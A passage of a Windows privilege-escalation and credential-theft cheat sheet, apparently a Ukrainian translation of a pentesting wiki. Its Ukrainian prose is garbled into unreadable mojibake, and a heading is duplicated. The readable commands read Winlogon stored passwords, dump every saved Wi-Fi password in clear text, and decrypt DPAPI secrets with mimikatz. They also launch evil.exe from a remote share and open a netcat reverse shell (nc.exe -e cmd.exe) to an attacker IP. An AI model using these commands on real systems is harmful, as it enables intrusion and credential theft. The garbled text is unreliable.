–Ø–∫—â–æ —É –≤–∞—Å —î **–ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å —É –ø–∞–ø—Ü—ñ, —è–∫–∞ —î –≤ PATH**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ DLL –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø—Ä–æ—Ü–µ—Å—É —Ç–∞ **–ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤**.

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –¥–æ–∑–≤–æ–ª–∏ –¥–ª—è –≤—Å—ñ—Ö –ø–∞–ø–æ–∫ —É PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ç–µ, —è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –ø–µ—Ä–µ–≤—ñ—Ä–∫–æ—é:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## –ú–µ—Ä–µ–∂–∞

### –†–µ—Å—É—Ä—Å–∏
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### —Ñ–∞–π–ª hosts

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å —ñ–Ω—à–∏—Ö –≤—ñ–¥–æ–º–∏—Ö –∫–æ–º–ø'—é—Ç–µ—Ä—ñ–≤, —è–∫—ñ –∑–∞—Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ —É —Ñ–∞–π–ª—ñ hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### –ú–µ—Ä–µ–∂–µ–≤—ñ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏ —Ç–∞ DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### –í—ñ–¥–∫—Ä–∏—Ç—ñ –ø–æ—Ä—Ç–∏

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **–æ–±–º–µ–∂–µ–Ω—ñ —Å–µ—Ä–≤—ñ—Å–∏** –∑–∑–æ–≤–Ω—ñ
```bash
netstat -ano #Opened ports?
```
### –¢–∞–±–ª–∏—Ü—è –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### –¢–∞–±–ª–∏—Ü—è ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### –ü—Ä–∞–≤–∏–ª–∞ –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–∞

[**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É –¥–ª—è –∫–æ–º–∞–Ω–¥, –ø–æ–≤'—è–∑–∞–Ω–∏—Ö –∑ –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–æ–º**](../basic-cmd-for-pentesters.md#firewall) **(—Å–ø–∏—Å–æ–∫ –ø—Ä–∞–≤–∏–ª, —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø—Ä–∞–≤–∏–ª, –≤–∏–º–∫–Ω–µ–Ω–Ω—è, –≤–∏–º–∫–Ω–µ–Ω–Ω—è...)**

–ë—ñ–ª—å—à–µ [–∫–æ–º–∞–Ω–¥ –¥–ª—è –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ –ø–µ—Ä–µ–ª—ñ–∫—É —Ç—É—Ç](../basic-cmd-for-pentesters.md#network)

### –ü—ñ–¥—Å–∏—Å—Ç–µ–º–∞ Windows –¥–ª—è Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
–ë—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `bash.exe` —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ root, –≤–∏ –∑–º–æ–∂–µ—Ç–µ —Å–ª—É—Ö–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –ø–æ—Ä—Ç (–ø–µ—Ä—à–∏–π —Ä–∞–∑ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ `nc.exe` –¥–ª—è –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è –ø–æ—Ä—Ç—É, –≤—ñ–Ω –∑–∞–ø–∏—Ç–∞—î —á–µ—Ä–µ–∑ GUI, —á–∏ —Å–ª—ñ–¥ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ `nc` —á–µ—Ä–µ–∑ –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
–î–ª—è –ª–µ–≥–∫–æ–≥–æ –∑–∞–ø—É—Å–∫—É bash –≤ —Ä–µ–∂–∏–º—ñ root –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ `--default-user root`

–í–∏ –º–æ–∂–µ—Ç–µ –¥–æ—Å–ª—ñ–¥–∂—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–æ–≤—É —Å–∏—Å—Ç–µ–º—É `WSL` —É –ø–∞–ø—Ü—ñ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## –û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Windows

### –û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### –ú–µ–Ω–µ–¥–∂–µ—Ä –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö / –°—Ö–æ–≤–∏—â–µ Windows

–ó [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
–°—Ö–æ–≤–∏—â–µ Windows –∑–±–µ—Ä—ñ–≥–∞—î –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–ª—è —Å–µ—Ä–≤–µ—Ä—ñ–≤, –≤–µ–±-—Å–∞–π—Ç—ñ–≤ —Ç–∞ —ñ–Ω—à–∏—Ö –ø—Ä–æ–≥—Ä–∞–º, —è–∫—ñ **Windows** –º–æ–∂–µ **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —É–≤—ñ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤**. –ù–∞ –ø–µ—Ä—à–∏–π –ø–æ–≥–ª—è–¥, —Ü–µ –º–æ–∂–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏ —Ç–∞–∫, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–æ–∂—É—Ç—å –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ —Å–≤–æ—ó –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Facebook, –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Twitter, –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Gmail —Ç–æ—â–æ, —â–æ–± –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —É–≤—ñ–π—Ç–∏ —á–µ—Ä–µ–∑ –±—Ä–∞—É–∑–µ—Ä–∏. –ê–ª–µ —Ü–µ –Ω–µ —Ç–∞–∫.

–°—Ö–æ–≤–∏—â–µ Windows –∑–±–µ—Ä—ñ–≥–∞—î –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, —è–∫—ñ Windows –º–æ–∂–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —É–≤—ñ–π—Ç–∏ –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –±—É–¥—å-—è–∫–∞ **–ø—Ä–æ–≥—Ä–∞–º–∞ Windows, —è–∫–∞ –ø–æ—Ç—Ä–µ–±—É—î –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Ä–µ—Å—É—Ä—Å—É** (—Å–µ—Ä–≤–µ—Ä–∞ –∞–±–æ –≤–µ–±-—Å–∞–π—Ç—É) **–º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π –ú–µ–Ω–µ–¥–∂–µ—Ä –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö** —Ç–∞ –°—Ö–æ–≤–∏—â–µ Windows —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞–¥–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∑–∞–º—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ–± –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –ø–æ—Å—Ç—ñ–π–Ω–æ –≤–≤–æ–¥–∏–ª–∏ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –ø–∞—Ä–æ–ª—å.

–Ø–∫—â–æ –ø—Ä–æ–≥—Ä–∞–º–∏ –Ω–µ –≤–∑–∞—î–º–æ–¥—ñ—é—Ç—å –∑ –ú–µ–Ω–µ–¥–∂–µ—Ä–æ–º –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, —è –Ω–µ –¥—É–º–∞—é, —â–æ –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–ª—è –ø–µ–≤–Ω–æ–≥–æ —Ä–µ—Å—É—Ä—Å—É. –¢–æ–º—É, —è–∫—â–æ –≤–∞—à–∞ –ø—Ä–æ–≥—Ä–∞–º–∞ —Ö–æ—á–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Å—Ö–æ–≤–∏—â–µ–º, –≤–æ–Ω–∞ –ø–æ–≤–∏–Ω–Ω–∞ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º **—Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –º–µ–Ω–µ–¥–∂–µ—Ä–æ–º –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö —Ç–∞ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–ª—è —Ü—å–æ–≥–æ —Ä–µ—Å—É—Ä—Å—É** –∑—ñ —Å—Ö–æ–≤–∏—â–∞ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º.

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `cmdkey`, —â–æ–± –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –Ω–∞ –º–∞—à–∏–Ω—ñ.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
–ü–æ—Ç—ñ–º –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `runas` –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ `/savecred`, —â–æ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ. –ù–∞–≤–µ–¥–µ–Ω–∏–π –Ω–∏–∂—á–µ –ø—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–ª–∏–∫–∞—î –≤—ñ–¥–¥–∞–ª–µ–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª —á–µ—Ä–µ–∑ SMB-—Ä–µ—Å—É—Ä—Å.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `runas` –∑ –Ω–∞–¥–∞–Ω–∏–º –Ω–∞–±–æ—Ä–æ–º –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), –∞–±–æ –∑ [–º–æ–¥—É–ª—è Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

**API –∑–∞—Ö–∏—Å—Ç—É –¥–∞–Ω–∏—Ö (DPAPI)** –Ω–∞–¥–∞—î –º–µ—Ç–æ–¥ —Å–∏–º–µ—Ç—Ä–∏—á–Ω–æ–≥–æ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö, –ø–µ—Ä–µ–≤–∞–∂–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω—ñ–π —Å–∏—Å—Ç–µ–º—ñ Windows –¥–ª—è —Å–∏–º–µ—Ç—Ä–∏—á–Ω–æ–≥–æ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –∞—Å–∏–º–µ—Ç—Ä–∏—á–Ω–∏—Ö –ø—Ä–∏–≤–∞—Ç–Ω–∏—Ö –∫–ª—é—á—ñ–≤. –¶–µ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–π –∞–±–æ —Å–∏—Å—Ç–µ–º–Ω–∏–π —Å–µ–∫—Ä–µ—Ç –¥–ª—è –∑–Ω–∞—á–Ω–æ–≥–æ –≤–Ω–µ—Å–∫—É –≤ –µ–Ω—Ç—Ä–æ–ø—ñ—é.

**DPAPI –¥–æ–∑–≤–æ–ª—è—î —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –∫–ª—é—á—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–∏–º–µ—Ç—Ä–∏—á–Ω–æ–≥–æ –∫–ª—é—á–∞, —è–∫–∏–π –ø–æ—Ö–æ–¥–∏—Ç—å –≤—ñ–¥ —Å–µ–∫—Ä–µ—Ç—ñ–≤ –≤—Ö–æ–¥—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**. –£ —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, —â–æ –≤–∫–ª—é—á–∞—é—Ç—å —Å–∏—Å—Ç–µ–º–Ω–µ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è, –≤–æ–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Å–µ–∫—Ä–µ—Ç–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–æ–º–µ–Ω—É —Å–∏—Å—Ç–µ–º–∏.

–ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –∫–ª—é—á—ñ RSA, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ DPAPI, –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ –∫–∞—Ç–∞–ª–æ–∑—ñ `%APPDATA%\Microsoft\Protect\{SID}`, –¥–µ `{SID}` –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î [—ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –±–µ–∑–ø–µ–∫–∏](https://en.wikipedia.org/wiki/Security\_Identifier) –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. **–ö–ª—é—á DPAPI, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –ø–æ—Ä—É—á –∑ –≥–æ–ª–æ–≤–Ω–∏–º –∫–ª—é—á–µ–º, —è–∫–∏–π –∑–∞—Ö–∏—â–∞—î –ø—Ä–∏–≤–∞—Ç–Ω—ñ –∫–ª—é—á—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ –æ–¥–Ω–æ–º—É —Ñ–∞–π–ª—ñ**, –∑–∞–∑–≤–∏—á–∞–π —Å–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∑ 64 –±–∞–π—Ç—ñ–≤ –≤–∏–ø–∞–¥–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö. (–í–∞–∂–ª–∏–≤–æ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ –¥–æ—Å—Ç—É–ø –¥–æ —Ü—å–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É –æ–±–º–µ–∂–µ–Ω–∏–π, —â–æ –∑–∞–ø–æ–±—ñ–≥–∞—î –ø–µ—Ä–µ–ª—ñ–∫—É –π–æ–≥–æ –≤–º—ñ—Å—Ç—É —á–µ—Ä–µ–∑ –∫–æ–º–∞–Ω–¥—É `dir` –≤ CMD, —Ö–æ—á–∞ –π–æ–≥–æ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ —á–µ—Ä–µ–∑ PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **–º–æ–¥—É–ª—å mimikatz** `dpapi::masterkey` –∑ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–º–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏ (`/pvk` –∞–±–æ `/rpc`) –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –π–æ–≥–æ.

**–§–∞–π–ª–∏ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, –∑–∞—Ö–∏—â–µ–Ω—ñ –º–∞–π—Å—Ç–µ—Ä-–ø–∞—Ä–æ–ª–µ–º**, –∑–∞–∑–≤–∏—á–∞–π —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω—ñ –≤:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **–º–æ–¥—É–ª—å mimikatz** `dpapi::cred` –∑ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–º `/masterkey` –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è.\
–í–∏ –º–æ–∂–µ—Ç–µ **–≤–∏—Ç—è–≥—Ç–∏ –±–∞–≥–∞—Ç–æ DPAPI** **masterkeys** –∑ **–ø–∞–º'—è—Ç—ñ** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–æ–¥—É–ª—è `sekurlsa::dpapi` (—è–∫—â–æ –≤–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑ –ø—Ä–∞–≤–∞–º–∏ root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### –û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ PowerShell

**–û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ PowerShell** —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è **—Å–∫—Ä–∏–ø—Ç—ñ–≤** —Ç–∞ –∑–∞–≤–¥–∞–Ω—å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó —è–∫ –∑—Ä—É—á–Ω–∏–π —Å–ø–æ—Å—ñ–± –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö. –¶—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∑–∞—Ö–∏—â–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **DPAPI**, —â–æ –∑–∞–∑–≤–∏—á–∞–π –æ–∑–Ω–∞—á–∞—î, —â–æ —ó—Ö –º–æ–∂–Ω–∞ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ –ª–∏—à–µ —Ç–∏–º —Å–∞–º–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º –Ω–∞ —Ç–æ–º—É –∂ –∫–æ–º–ø'—é—Ç–µ—Ä—ñ, –Ω–∞ —è–∫–æ–º—É –≤–æ–Ω–∏ –±—É–ª–∏ —Å—Ç–≤–æ—Ä–µ–Ω—ñ.

–î–ª—è **—Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è** –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö PS –∑ —Ñ–∞–π–ª—É, —â–æ —ó—Ö –º—ñ—Å—Ç–∏—Ç—å, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### –ó–±–µ—Ä–µ–∂–µ–Ω—ñ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è RDP

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —ó—Ö –∑–∞ —à–ª—è—Ö–æ–º `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
—Ç–∞ –≤ `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### –ù–µ–¥–∞–≤–Ω–æ –≤–∏–∫–æ–Ω–∞–Ω—ñ –∫–æ–º–∞–Ω–¥–∏
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **–ú–µ–Ω–µ–¥–∂–µ—Ä –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ —Ä–æ–±–æ—á–æ–≥–æ —Å—Ç–æ–ª—É**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –º–æ–¥—É–ª—å **Mimikatz** `dpapi::rdg` –∑ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–º `/masterkey`, —â–æ–± **—Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫—ñ —Ñ–∞–π–ª–∏ .rdg**\
–í–∏ –º–æ–∂–µ—Ç–µ **–≤–∏—Ç—è–≥—Ç–∏ –±–∞–≥–∞—Ç–æ –≥–æ–ª–æ–≤–Ω–∏—Ö –∫–ª—é—á—ñ–≤ DPAPI** –∑ –ø–∞–º'—è—Ç—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–æ–¥—É–ª—è Mimikatz `sekurlsa::dpapi`

### –ü—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω—ñ –Ω–æ—Ç–∞—Ç–∫–∏

–õ—é–¥–∏ —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –¥–æ–¥–∞—Ç–æ–∫ StickyNotes –Ω–∞ —Ä–æ–±–æ—á–∏—Ö —Å—Ç–∞–Ω—Ü—ñ—è—Ö –∑ Windows, —â–æ–± **–∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –ø–∞—Ä–æ–ª—ñ** —Ç–∞ —ñ–Ω—à—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –Ω–µ —É—Å–≤—ñ–¥–æ–º–ª—é—é—á–∏, —â–æ —Ü–µ —Ñ–∞–π–ª –±–∞–∑–∏ –¥–∞–Ω–∏—Ö. –¶–µ–π —Ñ–∞–π–ª —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –∑–∞ –∞–¥—Ä–µ—Å–æ—é `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` —ñ –∑–∞–≤–∂–¥–∏ –≤–∞—Ä—Ç–æ –π–æ–≥–æ —à—É–∫–∞—Ç–∏ —Ç–∞ –≤–∏–≤—á–∞—Ç–∏.

### AppCmd.exe

